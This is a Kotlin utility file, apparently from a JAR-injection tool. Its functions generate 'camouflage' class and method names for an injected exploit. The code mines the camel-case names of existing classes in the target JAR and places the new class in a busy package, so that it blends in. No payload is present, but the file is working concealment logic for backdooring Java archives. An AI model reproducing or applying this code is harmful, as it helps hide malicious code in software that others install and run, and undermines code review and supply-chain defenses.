package utils

import java.io.File
import java.util.*
import java.util.zip.ZipEntry
import java.util.zip.ZipFile
import kotlin.random.Random

data class Camouflage(
    val className: String,
    val methodName: String,
)

/**
 * Splits a camel case string into a list of words.
 *
 * @param s The camel case string to split.
 * @return A list of words.
 */
fun splitCamelCase(s: String): List<String> {
    return s.split("(?<!(^|[A-Z]))(?=[A-Z])|(?<!^)(?=[A-Z][a-z])".toRegex())
}

/**
 * Generates a unique name based on a dictionary and a list of existing file names.
 * The name is generated by concatenating random words from the dictionary.
 *
 * @param dict The dictionary of words to use for name generation.
 * @param files The list of existing file names to ensure uniqueness.
 * @param length The desired length range for the generated name (in terms of concatenated words).
 * @return A unique name string.
 */
fun uniqueName(dict: List<String>, files: List<String>, length: IntRange): String {
    var name: String
    var depth = 0
    do {
        // Generate a name by concatenating random words from the dictionary.
        name = (1..kotlin.random.Random.nextInt(length.first, length.last + 1))
            .map { dict[kotlin.random.Random.nextInt(dict.size)] }
            .joinToString("")

        // Add depth to the name if it's taking too long to find a unique name.
        if (depth > 10) name += depth.toString()
        depth++
    } while (files.contains(name)) // Ensure the generated name is unique.
    return name
}

/**
 * Calculates camouflage names for the exploit class and method based on the contents
 * of an existing JAR file. This helps in making the injected exploit less conspicuous.
 *
 * The process involves:
 * 1. Reading the class file structure from the JAR to identify packages and classes.
 * 2. Building a dictionary of potential name components from existing class names.
 * 3. Selecting a random directory and generating unique class and method names
 *    based on the dictionary and existing files in that directory.
 *
 * @param file The JAR file to analyze for camouflage names.
 * @return A [Camouflage] data class containing the generated class and method names.
 */
fun calculateCamouflage(file: File): Camouflage {
    // Map to store directory structure and files within each directory.
    val fileTree = mutableMapOf<String, MutableList<String>>()

    // Read the JAR file and populate the fileTree.
    ZipFile(file.canonicalPath).use { zipFile ->
        val zipEntries: Enumeration<*> = zipFile.entries()
        while (zipEntries.hasMoreElements()) {
            val zipEntry = zipEntries.nextElement() as ZipEntry
            if (zipEntry.isDirectory) continue

            val fileName: String = zipEntry.name
            val dir = fileName.substringBeforeLast("/", "") // Get directory path, default to empty string for root
            val name = fileName.substringAfterLast("/")

            // Only process class files.
            if (!name.endsWith(".class")) continue

            fileTree.getOrPut(dir) { mutableListOf() }.add(name)
        }
    }

    // Sort directories by the number of files they contain in descending order
    // and select one of the top directories to place the camouflaged class.
    val asList = fileTree.toList().sortedByDescending { it.second.size }
    // Limit the selection to the top 4 directories if there are more than one.
    val intoDirIndex = Random.nextInt(asList.size.coerceAtMost(4))
    val (dir, files) = asList[intoDirIndex]

    // Build a dictionary of potential name components from existing class names in the selected directory.
    val dict = mutableListOf<String>()
    for (f in files) {
        val fileName = f.substringBeforeLast(".")
        splitCamelCase(fileName)
            .map { it.replace("$", "") } // Remove inner class indicators
            .filter { it.length > 2 } // Filter out short names
            .forEach { if (!dict.contains(it)) dict.add(it) } // Add unique components to the dictionary
    }

    // Ensure the dictionary is not empty before generating names.
    if (dict.isEmpty()) {
        // Fallback to a default camouflage strategy if no suitable name components are found.
        // This might involve using random strings or a predefined list of common terms.
        // For simplicity, let's just use random lowercase strings for now.
        val className = if (dir.isEmpty()) makeRandomLowerCaseString(10) else "$dir/${makeRandomLowerCaseString(10)}"
        val methodName = makeRandomLowerCaseString(7)
        return Camouflage(className, methodName)
    }


    // Generate unique class and method names using the dictionary.
    val className = if (dir.isEmpty()) uniqueName(dict, files.map { it.substringBeforeLast(".") }, 2..3) else dir + "/" + uniqueName(dict, files.map { it.substringBeforeLast(".") }, 2..3)
    var methodName = uniqueName(dict, files.map { it.substringBeforeLast(".") }, 1..2)
    methodName = methodName.replaceFirstChar { if (it.isUpperCase()) it.lowercase() else it.toString() } // Ensure method name starts with lowercase

    return Camouflage(className, methodName)
}
